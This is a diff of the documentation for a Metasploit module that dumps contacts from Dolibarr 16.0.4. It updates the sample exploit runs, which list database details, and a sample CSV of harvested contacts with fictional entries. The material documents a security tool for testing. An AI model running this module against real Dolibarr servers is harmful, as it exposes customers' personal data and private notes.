@@ -8,11 +8,12 @@ Both public and private notes are also included in the dump.
 
 ### Dolibarr GitHub Repository & Dolibarr setup with vulnerable docker image
 
-If you need to setup Dolibarr, this is the official GitHub Repository from Dolibarr or via docker with an unofficial but working image and docker-compose.
+If you need to setup Dolibarr,
+this is the official GitHub Repository from Dolibarr or via docker with an unofficial but working image and docker-compose.
 ``` 
 Official GitHub Repository:
 
-https://github.com/Dolibarr/dolibarr/tree/16.0.4 
+https://github.com/Dolibarr/dolibarr/tree/16.0.4
 ```
 
 
@@ -90,7 +91,8 @@ msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS http://[Dolib
 RHOSTS => http://[Dolibarr domain]/
 msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 
-[+] Detected vulnerable Dolibarr version: 16.0.4                                         
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Detected vulnerable Dolibarr version: 16.0.4                                        
 [+] Database type: mysqli                                                                
 [+] Database name: dolibarr                                                              
 [+] Database user: dolibarr                                                              
@@ -110,7 +112,8 @@ msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set RHOSTS X.X.X.X
 RHOSTS => X.X.X.X
 msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 
-[+] Detected vulnerable Dolibarr version: 16.0.4
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. Detected vulnerable Dolibarr version: 16.0.4
 [-] unexpected-reply: Dolibarr data did not include contacts field
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
@@ -125,7 +128,8 @@ msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > set verbose true
 verbose => true
 msf6 auxiliary(scanner/http/dolibarr_16_contact_dump) > exploit
 
-[!] Detected apparently non-vulnerable Dolibarr version: 17.0.0 - proceeding anyway...
+[*] Running automatic check ("set AutoCheck false" to disable)
+[!] The target is not exploitable. Detected apparently non-vulnerable Dolibarr version: 17.0.0 ForceExploit is enabled, proceeding with exploitation.
 [-] unexpected-reply: Exploit response code: 403
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
@@ -168,8 +172,8 @@ Here is an example of what your .csv and .json files would look like if the cont
 
 ### .csv
 
-| id | country | country_code | state | state_code | region | region_code | note_public | note_private | note | name | lastname | firstname | civility_id | date_creation | civility_code | civility | civilite | address | zip | town | poste | email |
-|-----|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
-|  1  | FR | Rhône | 69 |   |   |   |   |   |   |   | Latourelle | Valentine |   | 1680275145 | MME | Mrs. |   | 1600, Place du Jeu de Paume | 69400 | VILLEFRANCHE-SUR-SAÔNE | CEO |  valentine@latourelle.latourelle |
-|  2  | FR |   |   |    |   |   |   | don't make any discount I don't like him |   |   |  Bolduc | Hugues |   | 1680275611 | MR | Mr. |   | 1200, rue Bonneterie | 59370 |  MONS-EN-BAROEUL | CEO | hugues@bolduc.bolduc |
-|  3  | FR | Rhône  | 69 |   |   |   |   |   |   |   | Gamelin | Felicien |   | 1680275763 | MR | Mr. |   | 5100, rue de la Boatie | 69000 | Lyon | DSI | felicien@gamelin.gamelin |
+| id | country_code | state | note_private | lastname | firstname | civility | address | zip | town | poste | email |
+|---|---|---|---|---|---|---|---|---|---|---|---|
+|  1  | FR | Rhône |   | Latourelle | Valentine | Mrs. | 1700, Place de Paume | 69400 | Bron | CEO |  valentine@latourelle.latourelle |
+|  2  | FR |   | don't make any discount |  Paston | Hugues | Mr. | 2200, rue Bonneteria | 59370 |  Mairieux | CEO | hugues@paston.paston |
+|  3  | FR | Rhône  |   | Grivois | Thierry | Mr. | 5100, rue de la Boatie | 69000 | Lyon | DSI | thierry@grivois.grivois |
